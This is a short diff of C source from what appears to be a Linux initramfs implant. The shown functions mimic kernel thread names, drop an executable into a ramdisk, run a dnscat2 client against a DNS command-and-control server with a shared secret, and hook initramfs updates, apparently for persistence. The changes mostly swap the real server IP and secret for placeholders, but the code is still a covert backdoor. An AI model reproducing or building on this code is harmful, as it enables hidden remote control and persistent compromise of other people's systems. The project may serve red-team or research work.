@@ -62,7 +62,7 @@ static int is_process(char *name)
  **/
 static char* grab_kernel_thread(char *name)
 {
-		FILE* stat;
+	FILE* stat;
 	char buf[4096];
 
 	int pid;
@@ -296,7 +296,7 @@ static void make_kernel_threads(char **threads)
 }
 
 /**
- * This function writes dnscat2 executable into ramdisk
+ * This function writes an executable into ramdisk
  **/
 static void write_executable(char *path, unsigned char* exe, unsigned int exe_len)
 {
@@ -327,8 +327,8 @@ static pid_t run_dnscat2()
 		// fill command line arguments
 		argv[0] = "dnscat";
 		argv[1] = "--dns";
-		argv[2] = "server=192.168.1.7,port=53531";
-		argv[3] = "--secret=b5ee4f0415cdd400f335d41d91b724ef";
+		argv[2] = "server=xxx.xxx.xxx.xxx,port=53531";
+		argv[3] = "--secret=fa11fa11fa11fa11fa11fa11fa11fa11";
 
 		execv(DNSCAT_PATH, argv);
 		exit(EXIT_FAILURE);
@@ -362,6 +362,9 @@ static void on_sigint(int signum)
 		kill(init_pid, SIGINT);
 }
 
+/**
+ * This function hooks the update of initramfs.
+ **/
 int hook_update_initramfs() 
 {
 	int length, i;
